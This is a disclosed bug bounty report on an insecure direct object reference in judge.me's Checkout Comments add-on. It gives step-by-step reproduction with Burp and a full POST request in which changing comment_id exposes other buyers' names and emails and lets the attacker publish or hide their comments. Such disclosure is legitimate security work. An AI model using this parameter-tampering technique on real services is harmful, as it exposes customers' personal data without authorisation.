# IDOR: leak buyer info & Publish/Hide foreign comments

## Report Details
- **Report ID**: 1410498
- **URL**: https://hackerone.com/reports/1410498
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-11-26T00:21:26.546Z
- **Disclosed**: 2022-03-31T14:04:41.478Z

## Reporter
- **Username**: chupa-chups
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: judgeme

## Vulnerability Information
HI @judgeme!
I noticed that the attacker can learn email users who left feedback at the time of buying.

Step to reproduce:

1. Login to our store and install your 'Checkout Comments' addon
2. Make fake order in or store and write a comment

███

3. Then go to our Shopify `/admin/apps/checkout-comments/extensions/checkout_comments/comments`
4. Publish our comment and Intercept request with burp. Send request to Repeater. Request example:

POST /extensions/checkout_comments/curate_comment HTTP/1.1
Host: judge.me
Cookie: _judgeme_session=████████████████; _ga=GA1.2.1935027813.1637882690; _gid=GA1.2.2043288340.1637882690; _fbp=fb.1.1637882690590.2069272048; _gat_UA-28424713-2=1
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://judge.me/extensions/checkout_comments/comments?platform=shopify&shop_domain=test-hackerone-glis.myshopify.com&page=3&offset=50
X-Csrf-Token: ████==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 23
Origin: https://judge.me
Te: trailers
Connection: close

comment_id=1&curated=ok



5. Edit `comment_id=random_id` and in Response we can see buyer information (for example):


`{"comment":{"id":1,"content":"classic dress watch for weddings","created_at":"over 3 years ago","product":{"title":"Dress Watch","url":"https://████.myshopify.com/products/dress-watch"},"buyer":{"name":"F F","email":"██████████@gmail.com"},"published_status":true,"published_status_text":"Published","curated":"ok"}}`


██████



Video POC:



██████

## Impact

Buyer information leaks and other

## Attachments
No attachments
